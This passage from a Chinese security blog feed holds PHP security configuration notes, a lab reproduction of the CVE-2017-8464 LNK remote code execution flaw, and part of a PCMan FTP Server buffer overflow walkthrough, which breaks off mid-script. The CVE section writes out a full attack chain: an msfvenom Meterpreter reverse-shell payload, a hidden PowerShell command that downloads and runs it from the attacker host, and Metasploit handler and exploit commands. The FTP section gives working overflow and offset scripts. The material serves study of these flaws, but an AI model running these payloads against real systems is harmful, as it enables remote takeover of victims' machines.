<li>不同系统、中间件之间的特性差异</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p>​                                                            <strong>常见<code>PHP_INI_*</code>常量的定义</strong></p>
<table>
<thead>
<tr>
<th align="center">常量</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>PHP_INI_USER</strong></td>
<td align="center">该配置选项可在用户的PHP脚本或Windows注册表中设置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_PERDIR</strong></td>
<td align="center">该配置选项可在<code>php.ini</code>、<code>.htaccess</code>或<code>httpd.conf</code>中设置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_SYSTEM</strong></td>
<td align="center">该配置选项可在<code>php.ini</code>或<code>httpd.conf</code>中配置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_ALL</strong></td>
<td align="center">该配置选项可在任何地方设置</td>
</tr>
<tr>
<td align="center"><strong>php.ini.only</strong></td>
<td align="center">该配置选项可仅可在php.ini中配置</td>
</tr>
</tbody></table>
<h4 id="常见核心配置"><a href="#常见核心配置" class="headerlink" title="常见核心配置"></a><strong>常见核心配置</strong></h4><p><font size='4' color='red'>register_globals(全局变量注册开关)</font></p>
<blockquote>
<p>版本：&lt;= <code>PHP 5.3.0</code></p>
</blockquote>
<p>在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用</p>
<p><font size='4' color='red'>allow_url_include(是否允许包含远程文件)</font></p>
<blockquote>
<p>版本：<code>PHP all</code>    PHP 5.2.0之后默认为Off</p>
<p>类似函数：<code>allow_url_fopen(是否打开远程文件)</code></p>
</blockquote>
<p>在该配置为on的情况下，它可以直接远程包含文件，当存在<code>include($var)</code>并且<code>$var</code>可控的情况下，可以直接控制其来执行PHP代码</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217095516607.png" alt="image-20201217095516607"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217100014708.png" alt="image-20201217100014708"></p>
<p><font size='4' color='red'>magic_quotes_gpc(魔术引号自动过滤)</font></p>
<blockquote>
<p>版本：<code>&lt; PHP 5.4</code>；    <code>PHP 5.3</code>之后不推荐使用该函数</p>
<p>置返回： <code>&lt; PHP 4.2.3</code>配置范围为PHP_INI_ALL；<code>&gt; PHP 4.2.3</code>配置范围为PHP_INI_PERDIR</p>
</blockquote>
<p>当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号<code>&#39;&#39;</code>、双引号<code>&quot;&quot;</code>、反斜杠<code>\</code>以及空字符<code>NULL</code>的前面加上反斜杠</p>
<p>在<code>PHP5</code>中<code>magic_quotes_gpc</code>不会过滤<code>$_SERVER</code>变量，导致很多client-ip、referer一类的漏洞能够利用。</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217102901642.png" alt="image-20201217102901642"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217103333525.png" alt="image-20201217103333525"></p>
<p><font size='4' color='red'>open_basedir(PHP可访问目录)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>范围：<code>&lt; PHP 5.2.3</code>配置范围为PHP_INI_SYSTEM；<code>&gt; PHP 5.2.3</code>配置范围PHP_INI_ALL</p>
</blockquote>
<p><code>open_basedir</code>指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到<code>open_basedir</code>指令中，多个目录用分号(<code>;</code>)分隔</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># `open_basedir`指定的实际上时前缀，而不是目录名</span>
open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a        
<span class="token shell-comment comment"># 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问</span>
open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a<span class="token operator">/</span>
<span class="token shell-comment comment"># 设置只能访问/www/a文件</span>
</code></pre>
<p>当<code>open_basedir</code>配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率</p>
<p><font size='4' color='red'>disable_functions(禁用函数)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>范围：该指令的配置范围为<code>php.ini only</code></p>
</blockquote>
<p>在正式生产环境中，为了更安全地允许PHP，也可以使用<code>disable_functions</code>指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将<code>dl()</code>函数加到禁止列表中，因为攻击者可以利用<code>dl()</code>函数来加载自定义的PHP扩展以突破<code>disable_functions</code>的限定</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># 多个函数之间用逗号（,）分隔</span>
disable_functions<span class="token operator">=</span>phpinfo<span class="token punctuation">,</span>eval<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>dl
</code></pre>
<p><font size='4' color='red'>disable_errors和error_reporting(错误显示)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>配置范围：PHP_INI_ALL</p>
</blockquote>
<p><code>disable_errors</code>表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。</p>
<p>为了避免一些安全隐患，在设置<code>disable_errors=On</code>时，还可以配置<code>error_reporting</code>，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。</p>
<p>​                                                                <strong>数字格式与变量格式的详细信息</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217152415931.png" alt="image-20201217152415931"></p>
<p>​                                                                             <strong>常用指令及说明</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217154018469.png" alt="image-20201217154018469"></p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-8464(快捷方式远程代码执行)漏洞复现</title>
    <url>/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="CVE-2017-8464-快捷方式远程代码执行"><a href="#CVE-2017-8464-快捷方式远程代码执行" class="headerlink" title="CVE-2017-8464(快捷方式远程代码执行)"></a>CVE-2017-8464(快捷方式远程代码执行)</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>微软<strong>2017年06月13日</strong>公布两个可被利用的远程代码执行漏洞其中**(CVE-2017-8464)LNK文件远程代码执行漏洞**曾被用在Stuxnet（震网病毒）软件中。Nessus在漏洞公布24小时内就已具备漏洞检查发现能力，Tenable用户只需要自动更新到最新的漏洞插件库，就能具备该漏洞发现能力。RCE漏洞存在于Windows处理LNK文件的环节。攻击者利用漏洞可以获得与本地用户相同的用户权限。被使用此漏洞攻击时，用户权限较少的账户相较管理员权限的用户受到的影响更小。</p>
<p><strong>漏洞名称：</strong>LNK文件远程代码执行漏洞<br><strong>漏洞编号：</strong>CVE-2017-8464<br><strong>漏洞等级：</strong>严重<br><strong>漏洞概要：</strong>如果用户打开攻击者精心构造的恶意LNK文件，则会造成远程代码执行。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 攻击者可以通过可移动驱动器(U盘)或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 </p>
<p><strong>漏洞利用条件和方式：</strong>远程利用<br><strong>漏洞影响范围:</strong> </p>
<ul>
<li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li>
<li>Microsoft Windows 10 Version 1607 for x64-based Systems</li>
<li>Microsoft Windows 10 for 32-bit Systems</li>
<li>Microsoft Windows 10 for x64-based Systems</li>
<li>Microsoft Windows 10 version 1511 for 32-bit Systems</li>
<li>Microsoft Windows 10 version 1511 for x64-based Systems</li>
<li>Microsoft Windows 10 version 1703 for 32-bit Systems</li>
<li>Microsoft Windows 10 version 1703 for x64-based Systems</li>
<li>Microsoft Windows 7 for 32-bit Systems SP1</li>
<li>Microsoft Windows 7 for x64-based Systems SP1</li>
<li>Microsoft Windows 8.1 for 32-bit Systems</li>
<li>Microsoft Windows 8.1 for x64-based Systems</li>
<li>Microsoft Windows RT 8.1</li>
</ul>
<blockquote>
<p><strong>服务器系统</strong></p>
</blockquote>
<ul>
<li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li>
<li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li>
<li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li>
<li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li>
<li>Microsoft Windows Server 2008 for x64-based Systems SP2</li>
<li>Microsoft Windows Server 2012</li>
<li>Microsoft Windows Server 2012 R2</li>
<li>Microsoft Windows Server 2016</li>
</ul>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Kali： 172.16.9.195</p>
<p>靶机：172.16.9.178</p>
<p><strong>1、Kali生成一个ps1的反弹shell木马</strong></p>
<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.9.195 lport=4448 -f  psh-reflection>/root/search.ps1
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503105623925.png" alt="image-20210503105623925"></p>
<p><strong>2、Kali开启http服务，将<code>search.ps1</code>文件移动至web根目录下</strong></p>
<pre class=" language-shell"><code class="language-shell">mv  search.ps1  /var/www/html
systemctl start apache2
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110302464.png" alt="image-20210503110302464"></p>
<p><strong>3、靶机访问Kali web服务器下的<code>search.ps1</code>文件，发现可以直接访问</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110222627.png" alt="image-20210503110222627"></p>
<p><strong>4、在靶机上创建一个PowerShell远程快捷方式</strong></p>
<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>windowstyle hidden <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('http://172.16.9.195/search.ps1');test.ps1"</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111554493.png" alt="image-20210503111554493"></p>
<p><strong>5、Kali进行监听，靶机执行后门文件</strong></p>
<pre class=" language-shell"><code class="language-shell">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST 172.16.9.195
set lport 4448
exploit
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111514093.png" alt="image-20210503111514093"></p>
<h2 id="msf模块实现"><a href="#msf模块实现" class="headerlink" title="msf模块实现"></a>msf模块实现</h2><pre class=" language-shell"><code class="language-shell">msfconsole
search cve-2017-8464
use exploit/windows/fileformat/cve_2017_8464_lnk_rce
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.9.195
exploit
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111733852.png" alt="image-20210503111733852"></p>
<blockquote>
<p>在/root/.msf4/local目录下生成我们的利用文件</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503112749608.png" alt="image-20210503112749608"></p>
<p><strong>全部复制到移动磁盘里面(u盘拷贝)</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/15018882278391.gif!small" alt="th.gif"></p>
<blockquote>
<p>然后在msf中监听</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">search multi/handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 172.16.9.195
run
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503113015015.png" alt="image-20210503113015015"></p>
]]></content>
      <tags>
        <tag>复现</tag>
        <tag>LNK</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出分析与利用(一)</title>
    <url>/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="PCMan’s-FTP-Server缓冲区溢出分析与利用"><a href="#PCMan’s-FTP-Server缓冲区溢出分析与利用" class="headerlink" title="PCMan’s FTP Server缓冲区溢出分析与利用"></a>PCMan’s FTP Server缓冲区溢出分析与利用</h1><p>知识大部分来源于学长<a href="https://taonn.github.io/">Tao’s Blog</a></p>
<h3 id="简单原理"><a href="#简单原理" class="headerlink" title="简单原理"></a>简单原理</h3><blockquote>
<p> 简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/overflow.png" alt="overflow"></p>
<h3 id="查找缓冲区溢出"><a href="#查找缓冲区溢出" class="headerlink" title="查找缓冲区溢出"></a>查找缓冲区溢出</h3><h4 id="模糊测试-Fuzzing"><a href="#模糊测试-Fuzzing" class="headerlink" title="模糊测试(Fuzzing)"></a>模糊测试(Fuzzing)</h4><blockquote>
<p>因为我们要完成一次缓冲区溢出测试，因此我们现在就需要知道哪里会发生缓冲区溢出，这里我们就需要进行模糊测试(fuzzing),现在我们需要发送不同长度和内容的自定义字符串到我们要测试的输入点，如果程序崩溃,那么我们就使用调试工具调查一下为什么会崩溃，可不可以利用,这里我们以<code>PCMan’s FTP Server 2.0.7</code>为例子</p>
</blockquote>
<p><strong>首先来测试一下用户名这个输入点有没有存在问题。</strong></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

<span class="token comment" spellcheck="true"># 通过调用程序后面的第一个参数得到IP地址</span>
host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true"># 通过调用程序后面的第二个参数目标的端口,转换成int类型</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># 设置初始字符数列为100</span>
fuzz <span class="token operator">=</span> <span class="token number">100</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># 创建套接字</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># 进行连接，connect参数为元组</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># 对用户名变量进行溢出测试</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"PASS Sheng"</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># 步长</span>
        fuzz <span class="token operator">+=</span> <span class="token number">100</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>打开<code>Immunityinc debugger</code>，然后<code>File-&gt;Attach</code> (首先要确保FTP程序已经在运行)</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209090121007.png" alt="image-20201209090121007"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209090252918.png" alt="image-20201209090252918"></p>
<blockquote>
<p>此时程序已经加载进来，是暂停状态， 我们使用快捷键<code>F9</code>让程序跑起来，也可以使用菜单栏的运行按钮</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209090405641.png" alt="image-20201209090405641"></p>
<blockquote>
<p>当程序处于<code>Running</code>状态的时候，我们再一次运行<code>fuzzing.py</code>脚本。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209090706612.png" alt="image-20201209090706612"></p>
<h4 id="查找偏移量（Finding-the-offset）"><a href="#查找偏移量（Finding-the-offset）" class="headerlink" title="查找偏移量（Finding the offset）"></a>查找偏移量（Finding the offset）</h4><blockquote>
<p>使用<code>Metasploit</code>的pattern_create工具创建一个500大小的字符串</p>
</blockquote>
<p>通过上面的测试，大概判断溢出字符在<code>2000-2100</code>, 那么我们填写<code>&#39;A&#39; * 1900 + &quot;工具生成字符&quot; </code>构成payload发送至FTP服务端</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201223160956310.png" alt="image-20201223160956310"></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2000</span>
payload <span class="token operator">=</span> <span class="token string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209092756228.png" alt="image-20201209092756228"></p>
<blockquote>
<p><code>EIP</code>寄存器的值是<code>0x64413564</code>, 为了计算这个值偏移量，我们使用Metasploit中的另一个工具<code>pattern_offset</code>来确定字节数</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">./pattern_offset.rb -l 500 -q 61413161
# -q参数为要查询的地址，-l参数为要查询的字符序列的长度
# 上图中我们得出的地址是 0x61413161, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 61413161
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201223161139801.png" alt="image-20201223161139801"></p>
<p><strong>计算结果为<code>4</code>, 也就是说覆盖返回地址是在<code>[2005-2009]</code> 这四个字节</strong></p>
<blockquote>
<p>验证</p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2004</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">"B"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209093245236.png" alt="image-20201209093245236"></p>
<p><strong>发现<code>EIP（程序返回地址）</code>被我们上面的4个B给覆盖了，到这一步，我们已经可以精确的覆盖<code>EIP</code>了</strong></p>
<h3 id="寻找shellcode位置"><a href="#寻找shellcode位置" class="headerlink" title="寻找shellcode位置"></a>寻找shellcode位置</h3><blockquote>
<p>在上面程序pyload后面加100个C，然后执行</p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2004</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"USER"</span> <span class="token operator">+</span> <span class="token string">"A"</span><span class="token operator">*</span>fuzz <span class="token operator">+</span> <span class="token string">"B"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">"C"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">"Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>err<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"End..., Send str length: "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fuzz<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201209093811606.png" alt="image-20201209093811606"></p>
<blockquote>
<p>可以看到，这里ESP指向的是我们在EIP后面给的<code>100个C</code>, 现在我们是要将C替换成我们希望运行的Shellcode。然后让EIP跳转到ESP寄存器的位置</p>
</blockquote>
<h4 id="查看可存放shellcode的位置大小"><a href="#查看可存放shellcode的位置大小" class="headerlink" title="查看可存放shellcode的位置大小"></a>查看可存放shellcode的位置大小</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket

host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
fuzz <span class="token operator">=</span> <span class="token number">2004</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
